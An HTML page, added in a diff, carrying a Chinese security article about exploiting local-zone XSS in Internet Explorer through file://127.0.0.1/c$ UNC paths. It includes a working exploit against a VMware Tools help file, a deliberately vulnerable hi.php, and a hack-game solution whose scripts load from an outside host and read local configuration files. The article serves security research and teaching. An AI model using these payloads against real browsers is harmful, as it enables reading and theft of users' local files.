@@ -1,0 +1,302 @@
+﻿<html>
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">		
+<title>走向本地的邪恶之路</title>
+</head>
+<body>
+<h4>走向本地的邪恶之路</h4>
+<pre style="width: 100%; word-wrap:break-word;">
+Author: superhei [http://hi.baidu.com/hi_heige]
+Team: www.80vul.com 
+www.ph4nt0m.org
+
+
+一、前言
+
+    本文其实源于去年我在blog上发起的《[技术挑战]How To Exploit Location Cross-Do
+main Scripting》里的IE部分，由于基本没人参与，只有我自己研究一下了，并且在基于自
+己的一些思路上，前段时间还搞了一个《HackGame No.1》，可惜还是没什么人响应...
+
+
+二、技术背景
+
+    在IE的历史【http://en.wikipedia.org/wiki/Internet_Explorer】上就安全上的改进
+来说，出现了几次重要整体上的安全防御部署的更新：
+
+    * Internet Explorer 6 sp2(August 25, 2004发布）加强各大安全区域的划分，并且推
+出“Local Machine Zone Lockdown”，这个也就使得本地xss漏洞变为鸡肋。（详见：附录[1]）
+
+    * Internet Explorer 7（October 18, 2006）主要是改进了“ActiveX Security” （详
+见：附录[2]）
+
+    * Internet Explorer 8（March 19, 2009）  推出了“XSS Filter” （详见：附录[3]）
+
+    上面提到的基本是最为sp或新版本更新的整体防御，当然在没个版本发布和每个月的漏
+洞日都有相当的安全更新，经过这么些年的缝缝补补，导致了ie的本地xss漏洞的利用空间
+越来越小...
+
+
+三、走向本地的邪恶之路
+
+    我们再看看本地xss的攻击流程：
+
+    外网通过iframe等标签--&gt;本地存在xss漏洞的文件--&gt;执行payload。
+
+    首先我们要找到从外网访问本地文件的方式，具体在ie里方法有：
+
+    A. about:协议
+    B. File://
+    C. res://
+    D. 加载chm文件的一些协议：ms-its,its,mk等
+    E. 其他的一些协议。
+
+    我们看看ie6 sp2后以上一些协议，对于about:本身的xss基本上是灭绝了，而res://直
+接降到了internet域，对于payload里操作也只可以在res://里徘徊，甚至不可以用file://
+和http://，至于ms-its,its,mk等虽然还是在“我的电脑”，但是ie6 sp2后默认是不让执
+行脚本等。
+
+    最后剩下file://协议，ie但是以来就队file://协议有着很好的支持，同样也给用户安
+全带来了巨大的隐患，ie6 sp2同样加强了对于file://的防御,比如不可以直接用file://从
+其他域访问到“我的电脑”域等。
+
+    首先我们看看file://访问文件的两方式：
+
+    a 用绝对路径调用本地文件 
+    b 通过UNC调用网络文件
+
+    对于这两方式的测试，在我的blog上有详细的描叙:（附录[4]） 
+
+    从blog文里可以看出，虽然用a方式可以访问到本地用“MOTW”标记为internet域的文
+件，但是这个权限也是小的可怜，对于b方式通过UNC访问网络文件，本身就在internet域，
+但是他这个域对应的是&quot;\\hostip\共享目录&quot;,对于windows而言，默认是开启各大盘的共享
+的：
+
+--code-------------------------------------------------------------------------
+C:\&gt;net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+IPC$                                         Remote IPC
+ADMIN$       C:\WINDOWS                      Remote Admin
+C$           C:\                             Default share
+The command completed successfully. 
+-------------------------------------------------------------------------------
+
+    那么这个域是相当‘巨大’的，比如我们可以通过file:////127.0.0.1/c$/的方式来访
+问本地c盘下的文件了。虽然严格意义来说这个没有跨域，但是它实现了我们访问本地文件
+的目标，这个也就是本文要阐述的“邪恶之路”。
+
+
+四、寻找本地之门[本地xss漏洞]
+
+    找到了通往本地的邪恶之路后，我们还需要找到的是本地存在xss漏洞的文件。同样对
+于ie6 sp2以后，为了防御本地xss攻击，增加了不少限制，比如限制对于非HTML文件的渲染
+[比如不渲染.txt .dat等文件]，这个意义是非常大的，直接导致我们寻找本地xss漏洞的文
+件类型越来越少。不过我们可以从下面一些思路寻找突破：
+
+    A  突破“对于不渲染非html文件”的限制，然后把有漏洞的代码写入本地调用。如
+CVE-2009-1140，附录[5]。
+
+    B  利用浏览器的缓存或者引诱用户下载、安装等方式引入有漏洞的html文件到本地。
+    
+    C  寻找本地有漏洞的html文件或没有被限制渲染的文件：比如系统自带的html，第3方
+软件安装的说明帮助的文件等。
+
+    对于A基本上是很难突破的，那么对于B用ie等浏览器的缓存是个不错的思路，问题是对
+于缓存的目录名都是随机的，或许暴力有那么一点点机会？至于下载安装等方式，当然你还
+要知道他放置的路径等，那属于“非技术”范畴这里不谈论，开来我们的希望在C上，对于
+系统自带的html存在xss漏洞那也所非常之渺茫，那么我们看看第3方软件引进的html文件，
+比如在VMwareTools的帮助文件（附录[6]）里代码：
+
+--code-------------------------------------------------------------------------
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.0//EN&quot; 
+	&quot;http://www.w3.org/TR/REC-html40/strict.dtd&quot;&gt;
+&lt;html&gt;
+ &lt;!-- Copyright (c) 2000-2006 Quadralay Corporation.  All rights reserved. --&gt;
+
+ &lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html&quot;&gt;
+  &lt;meta http-equiv=&quot;charset&quot;      content=&quot;UTF-8&quot;&gt;
+  &lt;!-- saved from url=(0014)about:internet --&gt;
+
+  &lt;title&gt;bookmark.htm&lt;/title&gt;
+ &lt;/head&gt;
+
+ &lt;body&gt;
+  &lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript1.2&quot;&gt;
+   &lt;!--
+    if ((typeof(window.opener) != &quot;undefined&quot;) &amp;&amp;
+        (window.opener != null))
+    {
+      //
+      //直接document.writeln了window.opener.WWHFrame.WWHHelp.mMessages.mBookmarkLinkMessage
+      //    
+      document.writeln(&quot;&lt;p&gt;&quot; + window.opener.WWHFrame.WWHHelp.mMessages.mBookmarkLinkMessage + &quot;&lt;\/p&gt;&quot;);
+      document.writeln(&quot;&lt;p&gt;&quot; + window.opener.WWHFrame.WWHControls.fBookmarkLink() + &quot;&lt;\/p&gt;&quot;);
+    }
+   // --&gt;
+  &lt;/script&gt;
+ &lt;/body&gt;
+&lt;/html&gt;
+-------------------------------------------------------------------------------
+
+    上面的代码如果我们可以控制window.opener.WWHFrame.WWHHelp.mMessages.mBookmarkLinkMessage，
+那么就可以实现我们的“本地xss漏洞文件”了。那么在ie7下window.opener是可控的，那
+么我们的exp如下：
+
+--code-------------------------------------------------------------------------
+&lt;html&gt;
+	&lt;body&gt;
+		&lt;iframe src=&quot;about:blank&quot;&gt;&lt;/iframe&gt;
+		&lt;script&gt;
+document.getElementsByTagName(&quot;IFRAME&quot;)[0].contentWindow.location=
+&#34;file:////127.0.0.1/c$/Program Files\VMware\VMware Tools\help\wwhelp\wwhimpl\common\html\bookmark.htm&#34;;
+			document.getElementsByTagName(&quot;IFRAME&quot;)[0].contentWindow.opener = 
+{WWHFrame:{WWHHelp:{mMessages:{mBookmarkLinkMessage:&quot;&lt;scr&quot;+&quot;ipt src=&#34;payload.js&#34;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;}},
+WWHControls:{fBookmarkLink:function(){return &quot;&quot;;}}}};
+		&lt;/script&gt;
+	&lt;/body&gt;
+&lt;/html&gt; 
+-------------------------------------------------------------------------------
+
+    上面的这个漏洞来源于“Attacking Rich Internet Applications”详见附录[7]（在
+里感谢kuazz55的分享！）
+
+    对于payload.js我们可以利用Xmlhttp等得到本地文件的代码了。
+
+
+五、《HackGame No.1》-- 来自本地web服务的危险
+
+    我们回到文章开头的《HackGame No.1》，在这个游戏里我设计了一个本地的web服务环
+境：win2k3+easyphp,浏览器用的ie7[不用考虑XSS Filter]，通过hi.php的代码和最后的提
+示的那个参考文章，那么很容易考虑到通过本地xss漏洞和csrf方式来引诱管理员来达到攻
+击目标。在这个游戏里主要是体现一个问题，对于本地web服务的环境里的文件，那既可以
+通过http协议来访问，也可以通过file：//127.0.0.1/c$来访问。那么hi.php就是一个”本
+地存在的xss漏洞的html文件“ 。：）
+
+hi.php代码：
+--code-------------------------------------------------------------------------
+&lt;HTML&gt;
+&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
+&lt;BODY&gt;
+Hi
+&lt;SCRIPT&gt;
+  var pos=document.URL.indexOf(&quot;name=&quot;)+5;
+  document.write(document.URL.substring(pos,document.URL.length));
+  //一个典型的dom-xss漏洞
+&lt;/SCRIPT&gt;
+&lt;BR&gt;
+  Welcome to our system
+&lt;/BR&gt;
+&lt;?php
+print stripslashes($_GET[&#34;go&#34;]);
+//这里是一个发射的xss漏洞，因为php解析问题，所以之可能在http下调用
+?&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+-------------------------------------------------------------------------------
+
+    通过上面的分析，那么我们的思路很明确了，通过http://127.0.0.1/hi.php?name=xss
+创建iframe调用file：//127.0.0.1/[hi.php的本地路径]实现本地xss攻击，如何构造payload
+调用xmlhttp读取目标文件。
+
+    那么现在面临两个问题：
+
+    A 获取hi.php的本地绝对路径
+    B 扩展名.php是不是会被ie渲染
+ 
+    要得到hi.php的本地路径，可以通过php爆错得到，easyphp在默认情况下是开启错误显
+示的，那么很简单通过print stripslashes($_GET[&#34;go&#34;]);这句就可以得到路径了。至于B，
+经过测试.php是可以被渲染的，最后的exp设计如下：
+
+--code-------------------------------------------------------------------------
+http://127.0.0.1/hi.php?name=&lt;script/src=&#34;http://www.80vul.com/hackgame/one.js&#34;&gt;&lt;/script&gt;
+-------------------------------------------------------------------------------
+
+one.js 
+--code-------------------------------------------------------------------------
+var request = false;
+        if(window.XMLHttpRequest) {
+            request = new XMLHttpRequest();
+            if(request.overrideMimeType) {
+                request.overrideMimeType(&#34;text/xml&#34;);
+            }
+        } else if(window.ActiveXObject) {
+            var versions = [&#34;Microsoft.XMLHTTP&#34;, &#34;MSXML.XMLHTTP&#34;, 
+            &#34;Microsoft.XMLHTTP&#34;, &#34;Msxml2.XMLHTTP.7.0&#34;,&#34;Msxml2.XMLHTTP.6.0&#34;,
+            &#34;Msxml2.XMLHTTP.5.0&#34;, &#34;Msxml2.XMLHTTP.4.0&#34;, &#34;MSXML2.XMLHTTP.3.0&#34;, 
+            &#34;MSXML2.XMLHTTP&#34;];
+            for(var i=0; i&lt;versions.length; i++) {
+                try {
+                    request = new ActiveXObject(versions[i]);
+                } catch(e) {}
+            }
+        }
+xmlhttp=request;
+xmlhttp.open(&quot;GET&quot;, document.URL, false);
+xmlhttp.send(null);
+var echo = xmlhttp.responseText;
+var reg = /go in &lt;b&gt;(.*)&lt;\/b&gt; on/
+var arr=reg.exec(echo);
+var webpath = arr[1].replace(&quot;C:&quot;,&quot;c$&quot;,&quot;g&quot;).replace(/\\/g,&quot;/&quot;);
+
+var iisrc=document.URL.match(/(.*)\?([^#]+)#?/)[1]+
+&quot;?name=&lt;iframe src=\&quot;file:////127.0.0.1/&quot;+webpath+
+&quot;?name=&lt;sc&quot;+&quot;ript src=&#34;http://www.80vul.com/hackgame/two.js&#34;&gt;&lt;/scr&quot;+
+&quot;ipt&gt;\&quot;&gt;&lt;/iframe&gt;&quot;
+var d = window.top.document;var newIframe = d.createElement(&#34;iframe&#34;);
+newIframe.src=iisrc;newIframe.style.width = 100;
+newIframe.style.height = 100;d.body.appendChild(newIframe);
+-------------------------------------------------------------------------------
+
+two.js 
+--code-------------------------------------------------------------------------
+xmlhttp=new ActiveXObject(&quot;Msxml2.XMLHTTP.3.0&quot;);
+xmlhttp.open(&quot;GET&quot;,&quot;../conf_files/httpd.conf&quot;,false);
+xmlhttp.send();
+alert(xmlhttp.responseText);
+-------------------------------------------------------------------------------
+
+    其实很多人在看到这个游戏的时候，联系我的blog，很容易想到利用unc的方式，但是
+基本没有人去实际一下，导致根本就没有意识到上面提到的A/B里路径和渲染的问题， 在这
+个设计前为了减少难度，所以来了个很明显得到路径的方法，如果没有这个提示呢？我们可
+以拖过列遍web目录下的文件访问，爆错得到路径，还可以通过phpinfo或者web应用程序本
+身显示路径的功能来提取.....
+
+    其他的思路：尝试“本地internet”利用file://直接访问本地文件,对于本地web服务
+http://127.0.0.1对应的是”internet域“，而http://localhost/对应的是“本地internet
+域&quot;,对于“本地internet域&quot;应该在“internet域”上可以同行的，比如可以用xmlhttp访问
+baidu.com等，这个问题在09年大牛Cesar Cerrudo的paper里谈论过（详见附录[8]），而文
+章上面提到\\127.0.0.1\c$\应该也属于”internet域“，或许可以访问到。不过可惜经过测
+试发现用xmlhttp访问有安全提示，这个应该属于http协议访问file协议导致的。
+
+
+六、小结
+
+    从本文的例子可以看得出来安全的进化，导致了本地xss漏洞的在ie上的利用是越来越
+困难。所幸运的是MS还给我们留下了一条通往本地的小路：file://UNCPath。这条小路给我
+们打开本地之门带来了一线希望。
+
+
+七、参考
+
+    《由IE6 location Cross-Domain Scripting引发的一点感慨》by firebug9，附录[9]
+
+
+八、附录
+
+[1] http://technet.microsoft.com/en-us/library/bb457150.aspx
+[2] http://msdn.microsoft.com/en-us/library/bb250493%28v=VS.85%29.aspx
+[3] http://blogs.msdn.com/b/ie/archive/2008/07/02/ie8-security-part-iv-the-xss-filter.aspx
+[4] http://hi.baidu.com/hi_heige/blog/item/acb023ac4e8130064b36d6a7.html
+[5] http://www.coresecurity.com/content/ie-security-zone-bypass
+[6] C:\Program Files\VMware\VMware Tools\help\wwhelp\wwhimpl\common\html\bookmark.htm
+[7] “Attacking Rich Internet Applications” (RUXCON 2008 presentation), Kuza55 and Stefano Di Paola, November 2008
+[8] http://www.argeniss.com/research/HackingIntranets.pdf
+[9] http://hi.baidu.com/firebug9/blog/item/b7627c4624cd880f6a63e5e7.html
+
+-EOF-
+</pre>
+</body>
+</html>
